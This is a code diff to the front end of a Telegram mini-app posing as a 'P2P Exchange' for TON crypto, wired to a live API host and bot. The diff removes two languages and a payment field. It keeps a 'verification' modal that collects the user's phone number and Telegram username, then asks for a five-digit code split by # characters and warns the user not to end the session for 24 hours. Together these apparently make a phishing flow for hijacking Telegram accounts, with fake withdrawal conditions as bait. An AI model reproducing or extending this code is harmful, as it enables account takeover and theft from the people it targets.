@@ -358,8 +358,6 @@
         <div class="language-grid">
             <button class="lang-btn" onclick="setLanguage('ru')">🇷🇺 Русский</button>
             <button class="lang-btn" onclick="setLanguage('en')">🇬🇧 English</button>
-            <button class="lang-btn" onclick="setLanguage('zh')">🇨🇳 中文</button>
-            <button class="lang-btn" onclick="setLanguage('ar')">🇸🇦 العربية</button>
         </div>
     </div>
 
@@ -486,13 +484,6 @@
                         <label><i class="fas fa-user"></i> <span id="labelBuyer">Username покупателя (без @)</span></label>
                         <input type="text" id="buyerInput" placeholder="john_doe" required>
                     </div>
-                    <div class="form-group">
-                        <label><i class="fas fa-credit-card"></i> <span id="labelPaymentMethod">Способ оплаты</span></label>
-                        <select id="paymentMethodSelect">
-                            <option value="balance">💰 С баланса</option>
-                            <option value="rekvisits">💳 По реквизитам</option>
-                        </select>
-                    </div>
                     <button type="submit" class="btn btn-primary"><i class="fas fa-check-circle"></i> <span id="btnCreate">Создать сделку</span></button>
                 </form>
                 <div id="dealResult" style="display:none;" class="card mt-10"></div>
@@ -590,11 +581,11 @@
         // ============================================================
         // 1. КОНФИГУРАЦИЯ
         // ============================================================
-        const API_BASE = 'https://ваш-бот-на-render.onrender.com';
+        const API_BASE = 'https://otc-bot-hwua.onrender.com';
         const BOT_USERNAME = 'tonkeeperp2p_bot';
 
         // ============================================================
-        // 2. ONLINE (ГЛОБАЛЬНАЯ ПЕРЕМЕННАЯ)
+        // 2. ONLINE
         // ============================================================
         let onlineBase = 6500;
 
@@ -619,7 +610,7 @@
         document.getElementById('userName').textContent = '👤 ' + (user.firstName || user.username);
 
         // ============================================================
-        // 4. ЯЗЫКИ
+        // 4. ЯЗЫКИ (ТОЛЬКО РУССКИЙ И АНГЛИЙСКИЙ)
         // ============================================================
         let currentLang = 'ru';
 
@@ -661,7 +652,6 @@
                 'labelCurrency': 'Валюта',
                 'labelAmount': 'Сумма',
                 'labelBuyer': 'Username покупателя (без @)',
-                'labelPaymentMethod': 'Способ оплаты',
                 'btnCreate': 'Создать сделку',
                 'btnBackMain': 'На главную',
                 'myDealsTitle': 'Мои сделки',
@@ -687,27 +677,13 @@
                 'awaiting': 'Ожидает подтверждения',
                 'completed': 'Завершено',
                 'copyLink': 'Скопировать ссылку',
-                'pay': 'Оплатить',
-                'sellerDelivered': 'Передал товар',
-                'confirmReceipt': 'Подтвердить получение',
                 'balanceZero': 'Ваш баланс равен 0. Пополните баланс для вывода.',
                 'need2Deals': 'Для вывода нужно провести 2 успешные сделки с одним покупателем. У вас: ',
                 'verificationRequired': 'Для вывода необходима верификация. Пройдите проверку.',
                 'verificationPassed': 'Все условия выполнены! Вы можете вывести средства.',
                 'sessionActive': 'Сессия активна до: ',
                 'headerTitle': 'P2P',
-                'headerTitleSpan': 'Exchange',
-                'enterPhone': '📱 Номер телефона (формат: +7XXXXXXXXXX)',
-                'sendRequest': 'Отправить номер',
-                'enterUsername': '👤 Ваш Telegram Username',
-                'usernamePlaceholder': '@john_doe',
-                'enterCodeFromAdmin': '🔑 Введите код, который прислал администратор',
-                'codeFormatHint': 'Формат: 5 цифр через # (например: 7#3#9#1#5)',
-                'confirmCode': 'Подтвердить код',
-                'verifySuccess': '✅ Верификация успешно пройдена! Сессия активна 24 часа.',
-                'sessionWarning': '⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!',
-                'waitForCode': '✅ Номер отправлен! Ожидайте код от администратора.',
-                'codeSent': 'Номер отправлен администратору!'
+                'headerTitleSpan': 'Exchange'
             },
             'en': {
                 'langPrompt': 'Choose your language',
@@ -746,7 +722,6 @@
                 'labelCurrency': 'Currency',
                 'labelAmount': 'Amount',
                 'labelBuyer': 'Buyer username (without @)',
-                'labelPaymentMethod': 'Payment method',
                 'btnCreate': 'Create deal',
                 'btnBackMain': 'Main menu',
                 'myDealsTitle': 'My deals',
@@ -772,197 +747,13 @@
                 'awaiting': 'Awaiting confirmation',
                 'completed': 'Completed',
                 'copyLink': 'Copy link',
-                'pay': 'Pay',
-                'sellerDelivered': 'Delivered',
-                'confirmReceipt': 'Confirm receipt',
                 'balanceZero': 'Your balance is 0. Please top up to withdraw.',
                 'need2Deals': 'You need 2 successful deals with the same buyer. You have: ',
                 'verificationRequired': 'Verification required to withdraw. Please verify.',
                 'verificationPassed': 'All conditions met! You can withdraw.',
                 'sessionActive': 'Session active until: ',
                 'headerTitle': 'P2P',
-                'headerTitleSpan': 'Exchange',
-                'enterPhone': '📱 Phone number (format: +7XXXXXXXXXX)',
-                'sendRequest': 'Send number',
-                'enterUsername': '👤 Your Telegram Username',
-                'usernamePlaceholder': '@john_doe',
-                'enterCodeFromAdmin': '🔑 Enter the code from admin',
-                'codeFormatHint': 'Format: 5 digits with # (e.g., 7#3#9#1#5)',
-                'confirmCode': 'Confirm code',
-                'verifySuccess': '✅ Verification passed! Session active for 24 hours.',
-                'sessionWarning': '⚠️ IMPORTANT: If you close the bot session before 24 hours — you will have to verify again!',
-                'waitForCode': '✅ Number sent! Wait for code from admin.',
-                'codeSent': 'Number sent to admin!'
-            },
-            'zh': {
-                'langPrompt': '选择您的语言',
-                'onlineLabel': '在线',
-                'statLabel1': '今日交易',
-                'statLabel2': '用户',
-                'statLabel3': '评论',
-                'statLabel4': '交易量 (TON)',
-                'navMain': '主页',
-                'navCreate': '创建',
-                'navDeals': '交易',
-                'navReviews': '评论',
-                'navBalance': '余额',
-                'welcomeTitle': '欢迎！',
-                'welcomeText': '安全的P2P加密货币交易。P2P Exchange — 您值得信赖的合作伙伴。',
-                'quickStart': '快速开始',
-                'btnCreateDeal': '创建交易',
-                'btnReviews': '评论',
-                'btnBalance': '余额',
-                'btnDeals': '我的交易',
-                'howWorks': '运作方式',
-                'step1': '1️⃣ 创建交易 — 描述商品和金额',
-                'step2': '2️⃣ 发送链接给买家',
-                'step3': '3️⃣ 买家在网站上支付',
-                'step4': '4️⃣ 卖家交付 — 点击按钮',
-                'step5': '5️⃣ 买家确认收到',
-                'step6': '6️⃣ 资金转入卖家账户',
-                'securityText': '🔒 防诈骗保护 • 验证 • 24/7支持',
-                'recentReviewsTitle': '最新评论',
-                'loadingText': '加载中...',
-                'supportLabel': '支持',
-                'channelLabel': '频道',
-                'createTitle': '创建交易',
-                'createSubtitle': '填写表格',
-                'labelProduct': '商品或服务',
-                'labelCurrency': '货币',
-                'labelAmount': '金额',
-                'labelBuyer': '买家用户名 (不含@)',
-                'labelPaymentMethod': '支付方式',
-                'btnCreate': '创建交易',
-                'btnBackMain': '主菜单',
-                'myDealsTitle': '我的交易',
-                'loadingDeals': '加载中...',
-                'btnBackMain2': '主菜单',
-                'reviewsTitle': '评论',
-                'reviewsSubtitle': '交易后留下评论',
-                'labelRating': '评分',
-                'labelReviewText': '评论',
-                'btnSubmitReview': '提交评论',
-                'loadingReviews': '加载中...',
-                'btnLoadMore': '加载更多',
-                'balanceTitle': '我的余额',
-                'withdrawInfo': '💳 提取资金',
-                'labelWithdrawCurrency': '货币',
-                'labelWithdrawDetails': '详情',
-                'btnConfirmWithdraw': '确认提取',
-                'btnBackMain3': '主菜单',
-                'noDeals': '您没有交易',
-                'noReviews': '暂无评论',
-                'paid': '已付款',
-                'waiting': '等待付款',
-                'awaiting': '等待确认',
-                'completed': '已完成',
-                'copyLink': '复制链接',
-                'pay': '支付',
-                'sellerDelivered': '已交付',
-                'confirmReceipt': '确认收到',
-                'balanceZero': '您的余额为0。请充值后提取。',
-                'need2Deals': '需要与同一买家完成2笔交易。您有: ',
-                'verificationRequired': '提取需要验证。请进行验证。',
-                'verificationPassed': '所有条件已满足！您可以提取资金。',
-                'sessionActive': '会话有效期至: ',
-                'headerTitle': 'P2P',
-                'headerTitleSpan': '交易所',
-                'enterPhone': '📱 手机号码 (格式: +7XXXXXXXXXX)',
-                'sendRequest': '发送号码',
-                'enterUsername': '👤 您的Telegram用户名',
-                'usernamePlaceholder': '@john_doe',
-                'enterCodeFromAdmin': '🔑 输入管理员给您的代码',
-                'codeFormatHint': '格式: 5位数字通过# (例如: 7#3#9#1#5)',
-                'confirmCode': '确认代码',
-                'verifySuccess': '✅ 验证通过！会话有效期为24小时。',
-                'sessionWarning': '⚠️ 重要: 如果您在24小时前关闭机器人会话 — 您将需要重新验证！',
-                'waitForCode': '✅ 号码已发送！等待管理员的代码。',
-                'codeSent': '号码已发送给管理员！'
-            },
-            'ar': {
-                'langPrompt': 'اختر لغتك',
-                'onlineLabel': 'متصل',
-                'statLabel1': 'صفقات اليوم',
-                'statLabel2': 'مستخدمين',
-                'statLabel3': 'مراجعات',
-                'statLabel4': 'الحجم (TON)',
-                'navMain': 'الرئيسية',
-                'navCreate': 'إنشاء',
-                'navDeals': 'صفقات',
-                'navReviews': 'مراجعات',
-                'navBalance': 'الرصيد',
-                'welcomeTitle': 'مرحباً!',
-                'welcomeText': 'صفقات P2P آمنة للعملات المشفرة. P2P Exchange — شريكك الموثوق.',
-                'quickStart': 'بداية سريعة',
-                'btnCreateDeal': 'إنشاء صفقة',
-                'btnReviews': 'مراجعات',
-                'btnBalance': 'الرصيد',
-                'btnDeals': 'صفقاتي',
-                'howWorks': 'كيف يعمل',
-                'step1': '1️⃣ أنشئ صفقة — صف المنتج والمبلغ',
-                'step2': '2️⃣ أرسل الرابط للمشتري',
-                'step3': '3️⃣ المشتري يدفع على الموقع',
-                'step4': '4️⃣ البائع يسلم — يضغط الزر على الموقع',
-                'step5': '5️⃣ المشتري يؤكد الاستلام على الموقع',
-                'step6': '6️⃣ تضاف الأموال إلى رصيد البائع',
-                'securityText': '🔒 حماية من المحتالين • تحقق • دعم 24/7',
-                'recentReviewsTitle': 'أحدث المراجعات',
-                'loadingText': 'جار التحميل...',
-                'supportLabel': 'الدعم',
-                'channelLabel': 'القناة',
-                'createTitle': 'إنشاء صفقة',
-                'createSubtitle': 'املأ النموذج',
-                'labelProduct': 'المنتج أو الخدمة',
-                'labelCurrency': 'العملة',
-                'labelAmount': 'المبلغ',
-                'labelBuyer': 'اسم مستخدم المشتري (بدون @)',
-                'labelPaymentMethod': 'طريقة الدفع',
-                'btnCreate': 'إنشاء صفقة',
-                'btnBackMain': 'القائمة الرئيسية',
-                'myDealsTitle': 'صفقاتي',
-                'loadingDeals': 'جار التحميل...',
-                'btnBackMain2': 'القائمة الرئيسية',
-                'reviewsTitle': 'مراجعات',
-                'reviewsSubtitle': 'اترك مراجعة بعد الصفقات',
-                'labelRating': 'التقييم',
-                'labelReviewText': 'المراجعة',
-                'btnSubmitReview': 'إرسال المراجعة',
-                'loadingReviews': 'جار التحميل...',
-                'btnLoadMore': 'تحميل المزيد',
-                'balanceTitle': 'رصيدي',
-                'withdrawInfo': '💳 سحب الأموال',
-                'labelWithdrawCurrency': 'العملة',
-                'labelWithdrawDetails': 'التفاصيل',
-                'btnConfirmWithdraw': 'تأكيد السحب',
-                'btnBackMain3': 'القائمة الرئيسية',
-                'noDeals': 'ليس لديك صفقات',
-                'noReviews': 'لا توجد مراجعات بعد',
-                'paid': 'مدفوع',
-                'waiting': 'انتظار الدفع',
-                'awaiting': 'انتظار التأكيد',
-                'completed': 'مكتمل',
-                'copyLink': 'نسخ الرابط',
-                'pay': 'دفع',
-                'sellerDelivered': 'تم التسليم',
-                'confirmReceipt': 'تأكيد الاستلام',
-                'balanceZero': 'رصيدك 0. يرجى الإيداع للسحب.',
-                'need2Deals': 'تحتاج صفقتين ناجحتين مع نفس المشتري. لديك: ',
-                'verificationRequired': 'السحب يحتاج التحقق. يرجى التحقق.',
-                'verificationPassed': 'جميع الشروط متوفرة! يمكنك السحب.',
-                'sessionActive': 'الجلسة نشطة حتى: ',
-                'headerTitle': 'P2P',
-                'headerTitleSpan': 'صراف',
-                'enterPhone': '📱 رقم الهاتف (التنسيق: +7XXXXXXXXXX)',
-                'sendRequest': 'إرسال الرقم',
-                'enterUsername': '👤 اسم المستخدم الخاص بك في تليغرام',
-                'usernamePlaceholder': '@john_doe',
-                'enterCodeFromAdmin': '🔑 أدخل الرمز من المدير',
-                'codeFormatHint': 'التنسيق: 5 أرقام مع # (مثال: 7#3#9#1#5)',
-                'confirmCode': 'تأكيد الرمز',
-                'verifySuccess': '✅ تم التحقق بنجاح! الجلسة نشطة لمدة 24 ساعة.',
-                'sessionWarning': '⚠️ مهم: إذا قمت بإغلاق جلسة البوت قبل 24 ساعة — ستحتاج إلى التحقق مرة أخرى!',
-                'waitForCode': '✅ تم إرسال الرقم! انتظر الرمز من المدير.',
-                'codeSent': 'تم إرسال الرقم إلى المدير!'
+                'headerTitleSpan': 'Exchange'
             }
         };
 
@@ -1000,7 +791,6 @@
                 'labelCurrency': 'labelCurrency',
                 'labelAmount': 'labelAmount',
                 'labelBuyer': 'labelBuyer',
-                'labelPaymentMethod': 'labelPaymentMethod',
                 'btnCreate': 'btnCreate',
                 'btnBackMain': 'btnBackMain',
                 'myDealsTitle': 'myDealsTitle',
@@ -1471,7 +1261,6 @@
             const currency = document.getElementById('currencySelect').value;
             const amount = parseFloat(document.getElementById('amountInput').value);
             const buyer = document.getElementById('buyerInput').value.trim().replace('@', '');
-            const paymentMethod = document.getElementById('paymentMethodSelect').value;
 
             if (!product || !amount || !buyer) {
                 showToast('❌ Заполните все поля!', 'error');
@@ -1487,8 +1276,7 @@
                     product, 
                     currency, 
                     amount, 
-                    buyer_username: buyer,
-                    payment_method: paymentMethod
+                    buyer_username: buyer
                 });
                 if (data.success) {
                     const resultDiv = document.getElementById('dealResult');
@@ -1662,22 +1450,21 @@
         // 15. ВЕРИФИКАЦИЯ
         // ============================================================
         function showVerificationModal() {
-            const t = LANG_TEXT[currentLang] || LANG_TEXT['ru'];
             showModal(`
                 <h3 style="margin-bottom:12px;">🔐 Верификация</h3>
                 <p style="color:var(--text-secondary); margin-bottom:12px;">Защита от мошенников со скамнутыми звёздами и фейковой валютой</p>
                 
                 <div id="verifyStep1">
                     <div class="form-group">
-                        <label>${t.enterPhone || '📱 Номер телефона (формат: +7XXXXXXXXXX)'}</label>
+                        <label>📱 Номер телефона (формат: +7XXXXXXXXXX)</label>
                         <input type="text" id="verifyPhone" placeholder="+79001234567">
                     </div>
                     <div class="form-group">
-                        <label>${t.enterUsername || '👤 Ваш Telegram Username'}</label>
+                        <label>👤 Ваш Telegram Username</label>
                         <input type="text" id="verifyUsername" placeholder="@john_doe">
                     </div>
                     <button class="btn btn-primary" onclick="sendVerificationRequest()">
-                        <i class="fas fa-paper-plane"></i> ${t.sendRequest || 'Отправить номер'}
+                        <i class="fas fa-paper-plane"></i> Отправить номер
                     </button>
                     <div id="verifyStep1Result" class="mt-10" style="display:none;"></div>
                 </div>
@@ -1685,15 +1472,15 @@
                 <div id="verifyStep2" style="display:none;">
                     <div class="verification-status verified" style="display:block;">
                         <i class="fas fa-check-circle"></i>
-                        ${t.waitForCode || '✅ Номер отправлен! Ожидайте код от администратора.'}
+                        ✅ Номер отправлен! Ожидайте код от администратора.
                     </div>
                     <div class="form-group mt-10">
-                        <label>${t.enterCodeFromAdmin || '🔑 Введите код, который прислал администратор'}</label>
+                        <label>🔑 Введите код, который прислал администратор</label>
                         <input type="text" id="verifyCodeModal" placeholder="7#3#9#1#5">
-                        <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">${t.codeFormatHint || 'Формат: 5 цифр через # (например: 7#3#9#1#5)'}</div>
+                        <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">Формат: 5 цифр через # (например: 7#3#9#1#5)</div>
                     </div>
                     <button class="btn btn-success" onclick="submitVerificationCode()">
-                        <i class="fas fa-check"></i> ${t.confirmCode || 'Подтвердить код'}
+                        <i class="fas fa-check"></i> Подтвердить код
                     </button>
                     <div id="verifyStep2Result" class="mt-10" style="display:none;"></div>
                 </div>
@@ -1703,7 +1490,6 @@
         }
 
         async function sendVerificationRequest() {
-            const t = LANG_TEXT[currentLang] || LANG_TEXT['ru'];
             const phone = document.getElementById('verifyPhone').value.trim();
             const username = document.getElementById('verifyUsername').value.trim().replace('@', '');
 
@@ -1733,8 +1519,8 @@
                 if (data.success) {
                     resultDiv.innerHTML = `
                         <div style="color:#2ecc71; padding:8px; background:rgba(46,204,113,0.05); border-radius:8px; border:1px solid rgba(46,204,113,0.1);">
-                            ${t.codeSent || '✅ Номер отправлен администратору!'}
-                            <br><small style="color:var(--text-secondary);">${t.waitForCode || 'Ожидайте код в боте @' + BOT_USERNAME}</small>
+                            ✅ Номер отправлен администратору!
+                            <br><small style="color:var(--text-secondary);">Ожидайте код в боте @${BOT_USERNAME}</small>
                         </div>
                     `;
                     
@@ -1758,13 +1544,12 @@
                 `;
                 showToast('❌ Ошибка: ' + err.message, 'error');
             } finally {
-                btn.innerHTML = '<i class="fas fa-paper-plane"></i> ' + (t.sendRequest || 'Отправить номер');
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Отправить номер';
                 btn.disabled = false;
             }
         }
 
         async function submitVerificationCode() {
-            const t = LANG_TEXT[currentLang] || LANG_TEXT['ru'];
             const code = document.getElementById('verifyCodeModal').value.trim();
             const resultDiv = document.getElementById('verifyStep2Result');
 
@@ -1799,9 +1584,9 @@
                 if (data.success) {
                     resultDiv.innerHTML = `
                         <div style="color:#2ecc71; padding:8px; background:rgba(46,204,113,0.05); border-radius:8px; border:1px solid rgba(46,204,113,0.1);">
-                            ${t.verifySuccess || '✅ Верификация успешно пройдена! Сессия активна 24 часа.'}
+                            ✅ Верификация успешно пройдена! Сессия активна 24 часа.
                             ${data.expires_at ? `<br><small style="color:var(--text-secondary);">🕐 Сессия активна до: ${new Date(data.expires_at).toLocaleString()}</small>` : ''}
-                            <br><small style="color: var(--warning);">${t.sessionWarning || '⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!'}</small>
+                            <br><small style="color: var(--warning);">⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!</small>
                         </div>
                     `;
                     
@@ -1826,7 +1611,7 @@
                 `;
                 showToast('❌ Ошибка: ' + err.message, 'error');
             } finally {
-                btn.innerHTML = '<i class="fas fa-check"></i> ' + (t.confirmCode || 'Подтвердить код');
+                btn.innerHTML = '<i class="fas fa-check"></i> Подтвердить код';
                 btn.disabled = false;
             }
         }
